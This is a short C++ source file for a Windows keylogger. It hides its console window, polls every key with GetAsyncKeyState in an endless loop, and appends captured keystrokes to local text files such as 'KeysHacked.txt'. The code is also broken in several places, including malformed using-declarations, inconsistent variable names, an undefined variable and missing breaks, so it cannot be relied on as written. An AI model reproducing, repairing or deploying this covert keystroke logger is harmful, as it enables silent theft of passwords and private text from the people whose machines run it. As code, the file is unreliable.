#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <string>

using std:fstream
using std:ofstream

void WriteData(std::string Text){
    ofstream LogFile;
    LogFile.open("Keys.txt", fstream::app);
    LogFile << Text;
    LogFile.close();
}


void Stealth(){
    HWND hwnd;
    AllocConsole();
    hwnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hwnd, 0);
}


bool isKeyListed(int vkey){
    switch (vkey){
    case VK_RETURN:
            WriteData("\n");
            break;
    case VK_BACK:
            WriteData("\b");
            break;
    case VK_SPACE:
            WriteData(" ");
    case Vk_SHIFT:
            WriteData(" *shift* ");
    case VK_OEM_PERIOD:
            WriteData(".");
            break;
    default: return false;
    }
}

int main(){
    Stealth();
    char key;
    while(1){
        for(Key = 8; Key <= 255; key++){
            if(GetAsyncKeyState(key) == -32767){
                if(isKeyListed(key) == 0){
                    ofstream LogFile;
                    LogFile.open("KeysHacked.txt", fstream::app);
                    LogFile << Text;
                    LogFile.close();
                }
            }
        }
    }
}